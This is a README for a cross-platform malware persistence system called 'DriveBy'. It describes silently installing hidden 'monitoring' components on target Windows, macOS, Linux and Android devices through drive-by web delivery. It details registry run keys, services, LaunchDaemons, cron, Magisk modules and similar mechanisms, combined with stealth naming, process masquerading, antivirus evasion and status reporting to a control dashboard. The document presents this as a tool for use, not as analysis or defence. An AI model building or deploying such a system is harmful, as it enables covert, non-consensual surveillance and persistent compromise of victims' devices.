# DriveBy Persistence System

The DriveBy system now includes comprehensive persistence mechanisms to ensure monitoring processes automatically restart after shutdown or restart across all supported platforms.

## Overview

The persistence system ensures that once deployed, the DriveBy monitoring components will:
- **Survive reboots** - Automatically restart after system shutdown/restart
- **Run at startup** - Begin monitoring immediately when the system boots
- **Self-recover** - Restart if processes are terminated
- **Stay hidden** - Use legitimate system mechanisms for stealth
- **Cross-platform** - Work on Windows, macOS, Linux, and Android

## Architecture

### Persistence Modules
- **`persistence/windows_persistence.py`** - Windows-specific persistence mechanisms
- **`persistence/macos_persistence.py`** - macOS-specific persistence mechanisms
- **`persistence/linux_persistence.py`** - Linux-specific persistence mechanisms
- **`persistence/android_persistence.py`** - Android-specific persistence mechanisms
- **`persistence/__init__.py`** - Cross-platform coordinator

### Installation Script
- **`install_persistence.py`** - Simple installer for target devices

## Windows Persistence

### Methods Implemented
1. **Registry Run Keys** - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
2. **Scheduled Tasks** - Windows Task Scheduler with boot/logon triggers
3. **Windows Services** - System service with automatic startup
4. **Startup Folder** - User startup folder with batch file

### Features
- **Multiple fallbacks** - If one method fails, others provide backup
- **Privilege escalation** - Attempts both user and system-level persistence
- **Stealth naming** - Uses legitimate-sounding names like "WindowsSecurityUpdate"
- **Auto-restart** - Monitors and restarts processes if terminated

### Installation
```bash
# Install Windows persistence
python persistence/windows_persistence.py

# Remove Windows persistence
python persistence/windows_persistence.py remove
```

## macOS Persistence

### Methods Implemented
1. **LaunchDaemons** - System-wide daemons (`/Library/LaunchDaemons/`)
2. **LaunchAgents** - User-level agents (`~/Library/LaunchAgents/`)
3. **Login Items** - macOS Login Items via System Events
4. **Cron Jobs** - Traditional Unix cron with `@reboot`
5. **Periodic Scripts** - macOS periodic execution (`/etc/periodic/daily/`)

### Features
- **App Bundle Creation** - Creates legitimate macOS app bundles
- **Property List (plist) Files** - Uses native macOS configuration format
- **Background Execution** - Runs without user interface (`LSUIElement`)
- **System Integration** - Integrates with macOS system services

### Installation
```bash
# Install macOS persistence
python persistence/macos_persistence.py

# Remove macOS persistence
python persistence/macos_persistence.py remove
```

## 🐧 Linux Persistence

### Methods Implemented
1. **Systemd Services** - Modern Linux service management
2. **Init.d Scripts** - Traditional SysV init scripts
3. **Cron Jobs** - User and system crontab entries
4. **rc.local** - Boot-time script execution
5. **XDG Autostart** - Desktop environment autostart

### Features
- **Service Management** - Full systemd integration with proper service files
- **Multi-init Support** - Works with systemd, SysV, and other init systems
- **User and System Level** - Both user session and system-wide persistence
- **Desktop Integration** - XDG autostart for desktop environments

### Installation
```bash
# Install Linux persistence
python persistence/linux_persistence.py

# Remove Linux persistence
python persistence/linux_persistence.py remove
```

## 🤖 Android Persistence

### Methods Implemented
1. **Init.d Scripts** - Android init.d system (rooted devices)
2. **Magisk Modules** - Magisk systemless modification framework
3. **Xposed Modules** - Xposed Framework integration
4. **Property Triggers** - Android property system triggers
5. **Termux Boot** - Termux boot script execution
6. **Systemd User Services** - For Android distributions with systemd

### Features
- **Root Detection** - Automatically detects and uses root capabilities
- **Magisk Integration** - Creates proper Magisk modules with metadata
- **Termux Support** - Works with Termux Android terminal environment
- **Multiple Frameworks** - Supports various Android modification frameworks

### Installation
```bash
# Install Android persistence
python persistence/android_persistence.py

# Remove Android persistence
python persistence/android_persistence.py remove
```

## 🎛️ Persistence Coordinator

### Automatic OS Detection
The persistence coordinator automatically detects the operating system and loads the appropriate persistence handler:

```python
from persistence import install_persistence, remove_persistence, check_persistence_status

# Install persistence for current OS
install_persistence()

# Check persistence status
check_persistence_status()

# Remove persistence
remove_persistence()
```

### Command Line Usage
```bash
# Install persistence
python -m persistence install

# Check status
python -m persistence status

# Remove persistence
python -m persistence remove
```

## Automatic Deployment

### Integration with Payloads
The persistence system integrates with the DriveBy payload deployment:

1. **Payload Delivery** - Monitoring scripts are deployed to target devices
2. **Persistence Installation** - `install_persistence.py` is automatically executed
3. **OS Detection** - System detects platform and installs appropriate persistence
4. **Verification** - Persistence status is verified and reported back

### Web Interface Integration
The persistence installer is served through the DriveBy web interface:
- **Automatic Download** - Target devices automatically download persistence installer
- **Silent Installation** - Persistence is installed without user interaction
- **Status Reporting** - Installation status is reported to the control dashboard

## Security Features

### Stealth Mechanisms
- **Legitimate Names** - Uses system-sounding service/process names
- **Hidden Execution** - Runs without visible windows or user interface
- **System Integration** - Uses native OS mechanisms for legitimacy
- **Process Masquerading** - Appears as legitimate system processes

### Anti-Detection
- **Multiple Methods** - Uses several persistence mechanisms simultaneously
- **Fallback Systems** - If one method is detected/removed, others remain
- **Legitimate Paths** - Installs in standard system locations
- **Native APIs** - Uses official OS APIs and frameworks

## Status Monitoring

### Persistence Status Check
Each platform provides detailed status checking:

```bash
# Windows
python persistence/windows_persistence.py status

# macOS
python persistence/macos_persistence.py status

# Linux
python persistence/linux_persistence.py status

# Android
python persistence/android_persistence.py status
```

### Status Information
- **Active Methods** - Shows which persistence mechanisms are active
- **Failed Methods** - Indicates which methods failed to install
- **Coverage Level** - Overall persistence coverage percentage
- **Auto-restart Status** - Whether processes will restart automatically

## 🛠️ Troubleshooting

### Common Issues

**Permission Errors:**
- Some persistence methods require administrator/root privileges
- User-level methods are used as fallbacks when elevated privileges unavailable

**Antivirus Detection:**
- Use legitimate system mechanisms to avoid detection
- Multiple methods provide redundancy if one is blocked

**Service Failures:**
- Check system logs for specific error messages
- Verify script paths and permissions are correct

### Manual Installation
If automatic installation fails, persistence can be installed manually:

```bash
# Navigate to DriveBy directory
cd /path/to/driveby

# Install persistence for current OS
python install_persistence.py
```

## Benefits

### Reliability
- **Multiple Mechanisms** - Several persistence methods per platform
- **Automatic Recovery** - Self-healing if processes are terminated
- **Boot Survival** - Survives system reboots and shutdowns

### Stealth
- **System Integration** - Uses legitimate OS mechanisms
- **Hidden Execution** - No visible user interface
- **Legitimate Naming** - System-sounding process names

### Coverage
- **Cross-Platform** - Works on all major operating systems
- **Comprehensive** - Multiple methods per platform for redundancy
- **Adaptive** - Automatically selects best methods for each system

The DriveBy persistence system ensures reliable, stealthy, and comprehensive monitoring that survives system restarts and provides continuous coverage across all target platforms.
